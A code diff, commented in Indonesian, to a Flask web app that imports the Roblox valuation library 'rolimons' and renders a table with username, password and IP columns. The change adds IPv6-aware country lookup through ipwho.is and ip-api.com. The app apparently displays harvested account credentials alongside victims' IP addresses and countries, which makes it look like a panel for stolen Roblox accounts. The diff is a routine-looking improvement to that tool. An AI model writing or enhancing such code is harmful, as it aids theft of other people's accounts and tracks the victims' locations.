@@ -2,9 +2,11 @@ from flask import Flask, request, jsonify, render_template_string
 import requests
 import time
 import rolimons
+import ipaddress # <-- Tambahan untuk cek IPv6
 
 app = Flask(__name__)
 
+# ... (Bagian HTML_PAGE tetap sama persis seperti yang kamu kirim sebelumnya) ...
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -183,7 +185,6 @@ HTML_PAGE = """
         font-size: 10px;
     }
 
-    /* CSS UNTUK TANGGAL DI HP */
     .date-mobile { 
         display: block; 
         font-size: 9px; 
@@ -200,7 +201,7 @@ HTML_PAGE = """
         .col-usn { max-width: none; }
         .col-pw { max-width: none; }
         .col-ip { text-align: left; width: auto;}
-        .date-mobile { display: none; } /* Sembunyikan di PC karena sudah ada kolom sendiri */
+        .date-mobile { display: none; } 
     }
 
     .modal-overlay {
@@ -545,9 +546,23 @@ def filter_account():
     country_name = "Unknown"
     if ip_addr:
         try:
-            ip_req = requests.get(f'http://ip-api.com/json/{ip_addr}?fields=status,country', timeout=5)
-            if ip_req.status_code == 200 and ip_req.json().get('status') == 'success':
-                country_name = ip_req.json().get('country', 'Unknown')
+            # --- PERBAIKAN DETEKSI IPV4 / IPV6 ---
+            # Cek apakah format IP-nya valid (IPv4 atau IPv6)
+            ip_obj = ipaddress.ip_address(ip_addr)
+            
+            if ip_obj.version == 6:
+                # API ip-api.com versi HTTP tidak mendukung IPv6.
+                # Kita gunakan API alternatif gratis (ipwho.is) yang mendukung IPv6 via HTTPS.
+                ip_req = requests.get(f'https://ipwho.is/{ip_addr}', timeout=5)
+                if ip_req.status_code == 200 and ip_req.json().get('success'):
+                    country_name = ip_req.json().get('country', 'Unknown')
+            else:
+                # IPv4 pakai API lama
+                ip_req = requests.get(f'http://ip-api.com/json/{ip_addr}?fields=status,country', timeout=5)
+                if ip_req.status_code == 200 and ip_req.json().get('status') == 'success':
+                    country_name = ip_req.json().get('country', 'Unknown')
+        except ValueError:
+            country_name = "Format IP Salah"
         except Exception:
             country_name = "IP Error"
     
